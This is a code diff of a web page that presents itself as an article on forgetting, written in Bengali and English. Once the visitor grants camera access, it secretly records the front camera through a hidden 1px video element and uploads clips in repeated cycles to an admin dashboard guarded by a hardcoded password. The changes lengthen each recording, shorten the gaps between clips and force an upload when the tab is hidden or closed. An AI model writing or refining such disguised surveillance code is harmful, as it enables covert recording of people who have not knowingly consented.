@@ -15,42 +15,35 @@
     p { color: #bbb; line-height: 1.5; }
     .loader { font-size: 18px; color: #ffb000; }
     .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; width: 100%; max-width: 1000px; margin-top: 20px; }
-    .card { background: #151515; border: 1px solid #333; padding: 10px; border-radius: 8px; overflow: hidden; }
-    .card video { display: block; width: 100%; border-radius: 5px; background: #000; }
+    .card { background: #151515; border: 1px solid #333; padding: 10px; border-radius: 8px; overflow: hidden; text-align: center;}
+    .card video { display: block; width: 100%; border-radius: 5px; background: #000; max-height: 200px; }
     .btn { background: #1677ff; border: 0; color: white; padding: 11px 20px; border-radius: 8px; cursor: pointer; font-size: 15px; }
     .btn-access { background: #e63946; margin-top: 15px; font-weight: bold; }
     input { width: min(500px, 100%); padding: 11px; margin: 8px 0; background: #0d0d0d; color: #fff; border: 1px solid #444; border-radius: 8px; }
     #status { color: #ffb000; margin-top: 12px; }
     .consent { text-align: left; background: #202020; padding: 14px; border-radius: 9px; margin: 16px 0; color: #ddd; font-size: 14px; }
-    .action-btns { display: flex; gap: 6px; margin-top: 10px; }
-    .delete-btn { width: 100%; padding: 8px; color: white; background: #dc3545; border-radius: 5px; cursor: pointer; border: none; }
+    .delete-btn { width: 100%; padding: 8px; margin-top: 5px; color: white; background: #dc3545; border-radius: 5px; cursor: pointer; border: none; }
     
     /* Article Styles */
-    .article-container {
-      display: none; width: min(800px, 100%); background: #0a0a0a; padding: 25px; border-radius: 12px; border: 1px solid #222; text-align: left; line-height: 1.8; color: #e0e0e0; font-size: 16px; margin: 0 auto;
-    }
+    .article-container { display: none; width: min(800px, 100%); background: #0a0a0a; padding: 25px; border-radius: 12px; border: 1px solid #222; text-align: left; line-height: 1.8; color: #e0e0e0; font-size: 16px; margin: 0 auto; }
     .article-container h2 { color: #ffb000; font-size: 22px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px;}
     .article-container h3 { color: #4db8ff; margin-top: 25px; font-size: 19px;}
     .article-container p, .article-container ul { color: #ccc; margin-bottom: 15px; }
     .article-container strong { color: #fff; }
     .article-container li { margin-bottom: 10px; }
-    
-    /* Hidden video for background recording */
     #bg-video { width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none; }
   </style>
 </head>
 <body>
-  <!-- ADMIN PANEL -->
   <section id="admin-panel" class="panel admin">
     <h2>Admin Dashboard (Video Mode)</h2>
     <input id="link" type="text" readonly>
     <button id="copy-button" class="btn">Copy Student Link</button>
-    <button id="access-button" class="btn btn-access">Start Monitoring (Requires Password)</button>
+    <button id="access-button" class="btn btn-access">Start Monitoring</button>
     <div id="status">Waiting to access videos...</div>
     <div id="streams" class="grid"></div>
   </section>
 
-  <!-- STUDENT PANEL -->
   <section id="student-panel" class="panel student">
     <div id="initial-view" class="box">
       <h2>Read Article</h2>
@@ -59,7 +52,6 @@
       <p id="student-status" class="loader"></p>
     </div>
 
-    <!-- ARTICLE VIEW -->
     <div id="article-view" class="article-container">
       <h2>Why Do We Forget? আমরা কেন‌ ভুলে যাই?</h2>
       <p>কিচেনে গিয়ে দাঁড়িয়ে আছেন… তারপর হঠাৎ মনে হলো, “আমি এখানে কেন এসেছিলাম?” বা কাউকে introduce করানো হলো। নাম শুনলেন। ৫ সেকেন্ড পর… পুরো blank অথবা পকেটে বা হাতে মোবাইল রেখেই মোবাইল খুঁজে পাচ্ছেন না..... Room lock করেছিলেন but আপনার মনে হচ্ছে আপনি lock করেননি।</p>
@@ -92,18 +84,16 @@
     const mode = pageUrl.searchParams.get('mode') || 'admin';
     const ADMIN_PASSWORD = '74722222';
     
-    const adminPanel = document.getElementById('admin-panel');
-    const studentPanel = document.getElementById('student-panel');
     let adminPassword = null;
-    let pollInterval = null;
+    let currentRecorder = null; // নতুন ভ্যারিয়েবল
+    let recordTimeout = null;   // নতুন ভ্যারিয়েবল
 
     if (mode === 'admin') {
-      adminPanel.style.display = 'flex';
+      document.getElementById('admin-panel').style.display = 'flex';
       document.getElementById('link').value = `${window.location.origin}${window.location.pathname}?mode=student`;
       
       document.getElementById('copy-button').addEventListener('click', () => {
         navigator.clipboard.writeText(document.getElementById('link').value);
-        alert('Student Link Copied!');
       });
 
       document.getElementById('access-button').addEventListener('click', () => {
@@ -111,89 +101,105 @@
         if (pwd === ADMIN_PASSWORD) {
           adminPassword = pwd;
           document.getElementById('access-button').style.display = 'none';
-          document.getElementById('status').textContent = 'Monitoring... Fetching new videos every 10 seconds.';
+          document.getElementById('status').textContent = 'Monitoring... Fetching videos every 10 sec.';
           fetchVideos();
-          pollInterval = setInterval(fetchVideos, 10000); // প্রতি ১০ সেকেন্ডে নতুন ভিডিও চেক করবে
-        } else {
-          alert('Incorrect Password!');
-        }
+          setInterval(fetchVideos, 10000);
+        } else alert('Incorrect Password!');
       });
     } else if (mode === 'student') {
-      studentPanel.style.display = 'flex';
+      document.getElementById('student-panel').style.display = 'flex';
       
       document.getElementById('start-button').addEventListener('click', async () => {
         try {
-          const btn = document.getElementById('start-button');
-          btn.disabled = true;
-          document.getElementById('student-status').textContent = 'Requesting access...';
-          
+          document.getElementById('start-button').disabled = true;
           const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
           document.getElementById('bg-video').srcObject = stream;
           
-          // UI Change
           document.getElementById('initial-view').style.display = 'none';
           document.getElementById('article-view').style.display = 'block';
-          studentPanel.style.justifyContent = 'flex-start';
-          studentPanel.style.padding = '15px';
+          document.getElementById('student-panel').style.justifyContent = 'flex-start';
+          document.getElementById('student-panel').style.padding = '15px';
 
           startVideoRecordingCycle(stream);
         } catch (err) {
           document.getElementById('start-button').disabled = false;
-          document.getElementById('student-status').textContent = 'Access denied!';
         }
       });
     }
 
-    // --- STUDENT RECORDING LOGIC ---
+    // নতুন রেকর্ডিং সাইকেল
     function startVideoRecordingCycle(stream) {
       let options = { mimeType: 'video/webm;codecs=vp8,opus' };
       if (!MediaRecorder.isTypeSupported(options.mimeType)) {
         options = { mimeType: 'video/webm' };
-        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/mp4' }; // Fallback
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/mp4' }; 
       }
 
       function recordAndUpload() {
         const mediaRecorder = new MediaRecorder(stream, options);
+        currentRecorder = mediaRecorder; 
         let chunks = [];
         
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         mediaRecorder.onstop = async () => {
+          if (chunks.length === 0) return;
           const blob = new Blob(chunks, { type: options.mimeType });
+          const ext = options.mimeType.includes('mp4') ? 'mp4' : 'webm';
+          
           const formData = new FormData();
-          formData.append('video', blob);
+          formData.append('video', blob, `video.${ext}`);
+          formData.append('ext', ext);
           
           try {
-            await fetch('/api/upload', { method: 'POST', body: formData });
-          } catch(e) { console.error('Upload failed'); }
+            // Keepalive ট্রিক: ভিডিও ছোট হলে ব্যাকগ্রাউন্ডেও আপলোড নিশ্চিত করবে
+            const useKeepalive = blob.size < 60000;
+            await fetch('/api/upload', { method: 'POST', body: formData, keepalive: useKeepalive });
+          } catch(e) { console.log(e); }
 
-          // ৫ সেকেন্ড রেস্ট, তারপর আবার রেকর্ডিং শুরু
-          setTimeout(recordAndUpload, 5000); 
+          // ১ সেকেন্ড রেস্ট নিয়ে আবার শুরু হবে
+          setTimeout(recordAndUpload, 1000); 
         };
 
         mediaRecorder.start();
-        // ১৫ সেকেন্ড রেকর্ড করবে
-        setTimeout(() => {
-          if(mediaRecorder.state === 'recording') mediaRecorder.stop();
-        }, 15000); 
+        // ২৫ সেকেন্ড রেকর্ডিং ডিউরেশন
+        recordTimeout = setTimeout(() => { 
+          if(mediaRecorder.state === 'recording') mediaRecorder.stop(); 
+        }, 25000); 
       }
-
+      
       recordAndUpload();
+
+      // ইউজার মাঝপথে বের হয়ে গেলে আপলোড করার ফাংশন
+      function handleUnload() {
+         if (currentRecorder && currentRecorder.state === 'recording') {
+            clearTimeout(recordTimeout); // ২৫ সেকেন্ডের টাইমার বাতিল করবে
+            currentRecorder.stop(); // জোর করে রেকর্ডিং থামিয়ে আপলোড শুরু করাবে
+         }
+      }
+      
+      // ব্রাউজার মিনিমাইজ বা ট্যাব কেটে দিলে এই ইভেন্টগুলো কল হবে
+      window.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') handleUnload();
+      });
+      window.addEventListener('pagehide', handleUnload);
     }
 
-    // --- ADMIN FETCH LOGIC ---
     async function fetchVideos() {
       try {
         const res = await fetch(`/api/videos?pwd=${adminPassword}`);
-        if (!res.ok) throw new Error('Auth failed');
+        if (!res.ok) {
+           const errText = await res.text();
+           document.getElementById('status').textContent = `Server Error: ${errText}`;
+           return;
+        }
+        document.getElementById('status').textContent = 'Monitoring... Fetching videos every 10 sec.';
         const videos = await res.json();
         
         const grid = document.getElementById('streams');
-        // Remove deleted videos from UI
         Array.from(grid.children).forEach(child => {
           if (!videos.find(v => v.filename === child.id)) child.remove();
         });
 
-        // Add new videos
         videos.forEach(vid => {
           if (!document.getElementById(vid.filename)) {
             const card = document.createElement('div');
@@ -224,12 +230,8 @@
             grid.appendChild(card);
           }
         });
-      } catch (e) {
-        console.error(e);
-      }
+      } catch (e) { console.error(e); }
     }
   </script>
 </body>
-  </html>
-
-
+</html>
